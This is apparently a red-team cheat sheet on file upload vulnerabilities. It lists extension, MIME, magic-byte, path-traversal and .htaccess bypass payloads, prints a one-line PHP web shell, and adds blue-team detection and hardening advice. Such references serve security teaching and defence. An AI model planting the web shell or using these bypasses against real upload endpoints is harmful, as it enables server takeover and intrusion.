---
title: "File upload vulnerabilities"
category: "red-team"
tags: ["web", "file-upload", "rce"]
platform: "web"
mitre: ["T1190"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# File Upload → RCE

## TL;DR
Weak upload validation → uploading a web shell (e.g. `.php`) and executing code. Bypasses: extensions, MIME, magic bytes, path traversal.

## Bypass techniques
```text
Extensions:  shell.php.jpg  shell.pHp  shell.phtml  shell.php5  shell.php%00.jpg
MIME:        change Content-Type to image/png (while content is PHP)
Magic bytes: GIF89a; <?php system($_GET['c']); ?>
Double ext:  .jpg.php
Path traversal: filename="../../shell.php"
.htaccess:   upload an .htaccess mapping .xyz -> php
```

## Minimal web shell (lab testing)
```php
<?php system($_GET['cmd']); ?>
```

## Detection (Blue Team)
- Executable files in upload directories, access to freshly uploaded `.php`.
- WAF: web shell signatures, anomalous `cmd=` parameters.
- FIM on upload directories.

## Mitigation / Hardening
- Allow-list of extensions + content verification (magic bytes), random rename.
- Store uploads **outside the web root** / in non-executing storage (S3, `X-Content-Type-Options`).
- Disable execution in the upload directory (no PHP handler), AV scanning.

## Sources
- [OWASP – Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
